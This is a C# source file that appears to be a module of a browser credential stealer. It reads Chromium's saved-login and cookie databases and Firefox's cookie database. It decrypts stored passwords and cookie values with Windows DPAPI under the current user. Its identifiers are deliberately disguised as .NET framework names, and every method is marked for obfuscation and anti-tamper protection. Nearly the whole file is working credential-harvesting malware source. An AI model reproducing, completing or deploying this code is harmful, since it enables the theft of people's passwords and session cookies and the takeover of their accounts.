using System;
using System.Collections.Generic;
using System.IO;
using System.Security.Cryptography;
using System.Text;
using System.Reflection;

namespace DebuggerStepThroughAttribute.Base
{
    public class Chromium
    {
        [Obfuscation(Exclude = false, Feature = "+koi;-ctrl flow;+anti tamper")]
        public static List<LD> GETLDSs(string dataPath, bn InheritanceDemand)
        {
            var MetadataEnumResult = new List<LD>();
            SQLiteHandler db = null;

            if(!File.Exists(dataPath))
            {
                return MetadataEnumResult;
            }

            try
            {
                db = new SQLiteHandler(dataPath);
            } catch (Exception)
            {
                return MetadataEnumResult;
            }

            if(!db.ReadTable("logins"))
            {
                return MetadataEnumResult;
            }

            string host, ParameterModifier, FilterTypeName;
            int entries = db.GetRowCount();

            for (int i = 0; i < entries; i++)
            {
                try
                {
                    host = db.GetValue(i, "origin_url");
                    ParameterModifier = db.GetValue(i, "username_value");
                    FilterTypeName = Decrypt(db.GetValue(i, "password_value"));

                    if(!String.IsNullOrEmpty(host) 
                        && !String.IsNullOrEmpty(ParameterModifier) 
                        && !String.IsNullOrEmpty(FilterTypeName))
                    {
                        MetadataEnumResult.Add(new LD
                        {
                            Url = host,
                            PropertyInfo = ParameterModifier,
                            FilterTypeNameIgnoreCase = FilterTypeName,
                            InheritanceDemand = InheritanceDemand
                        });
                    }
                } catch (Exception)
                {
                    return MetadataEnumResult;
                }
            }

            return MetadataEnumResult;
        }
        [Obfuscation(Exclude = false, Feature = "+koi;-ctrl flow;+anti tamper")]
        public static List<IReflectableType> GETOPAG(string dataPath, bn InheritanceDemand)
        {
            var MetadataToken = new List<IReflectableType>();
            SQLiteHandler db = null;

            if(!File.Exists(dataPath))
            {
                return MetadataToken;
            }

            try
            {
                db = new SQLiteHandler(dataPath);
            } catch (Exception)
            {
                return MetadataToken;
            }

            if(!db.ReadTable("cookies"))
            {
                return MetadataToken;
            }

            string host, name, value, path, expires, lastAccess;
            bool secure, http, expired, persistent, priority;

            int entries = db.GetRowCount();

            for (int i = 0; i < entries; i++)
            {
                try
                {
                    host = db.GetValue(i, "host_key");
                    name = db.GetValue(i, "name");
                    value = Decrypt(db.GetValue(i, "encrypted_value"));
                    //path = db.GetValue(i, "path");
                    //expires = db.GetValue(i, "expires_utc");
                    //lastAccess = db.GetValue(i, "last_access_utc");

                    //secure = db.GetValue(i, "secure") == "1";
                    //http = db.GetValue(i, "httponly") == "1";
                    //expired = db.GetValue(i, "has_expired") == "1";
                    //persistent = db.GetValue(i, "persistent") == "1";
                    //priority = db.GetValue(i, "priority") == "1";

                    if(!String.IsNullOrEmpty(host) && !String.IsNullOrEmpty(name) && !String.IsNullOrEmpty(value))
                    {
                        MetadataToken.Add(new IReflectableType
                        {
                            HostKey = host,
                            Name = name,
                            Value = value,
                            InheritanceDemand = InheritanceDemand
                        });
                    }
                } catch (Exception)
                {
                    return MetadataToken;
                }
            }

            return MetadataToken;
        }

        [Obfuscation(Exclude = false, Feature = "+koi;-ctrl flow;+anti tamper")]
        public static List<IReflectableType> GETOPAGFF(string dataPath, bn InheritanceDemand)
        {
            var MetadataToken = new List<IReflectableType>();
            SQLiteHandler db = null;

            if (!File.Exists(dataPath))
            {
                return MetadataToken;
            }

            try
            {
                db = new SQLiteHandler(dataPath);
            }
            catch (Exception)
            {
                return MetadataToken;
            }

            if (!db.ReadTable("moz_cookies"))
            {
                return MetadataToken;
            }

            string host, name, value, path, expires, lastAccess;
            bool secure, http, expired, persistent, priority;

            int entries = db.GetRowCount();

            for (int i = 0; i < entries; i++)
            {
                try
                {
                    host = db.GetValue(i, "host");
                    name = db.GetValue(i, "name");
                    value = db.GetValue(i, "value");
                    //path = db.GetValue(i, "path");
                    //expires = db.GetValue(i, "expires_utc");
                    //lastAccess = db.GetValue(i, "last_access_utc");

                    //secure = db.GetValue(i, "secure") == "1";
                    //http = db.GetValue(i, "httponly") == "1";
                    //expired = db.GetValue(i, "has_expired") == "1";
                    //persistent = db.GetValue(i, "persistent") == "1";
                    //priority = db.GetValue(i, "priority") == "1";

                    if (!String.IsNullOrEmpty(host) && !String.IsNullOrEmpty(name) && !String.IsNullOrEmpty(value))
                    {
                        MetadataToken.Add(new IReflectableType
                        {
                            HostKey = host,
                            Name = name,
                            Value = value,
                            InheritanceDemand = InheritanceDemand
                        });
                    }
                }
                catch (Exception)
                {
                    return MetadataToken;
                }
            }

            return MetadataToken;
        }

        [Obfuscation(Exclude = false, Feature = "+koi;-ctrl flow;+anti tamper")]
        private static string Decrypt(string data)
        {
            if(data == null)
            {
                return null;
            }

            byte[] decryptedData = ProtectedData.Unprotect(System.Text.Encoding.Default.GetBytes(data), null, DataProtectionScope.CurrentUser);
            return Encoding.UTF8.GetString(decryptedData);
        }

        [Obfuscation(Exclude = false, Feature = "+koi;-ctrl flow;+anti tamper")]
        public static void GETOPAGFX()
        {

        }
    }
}
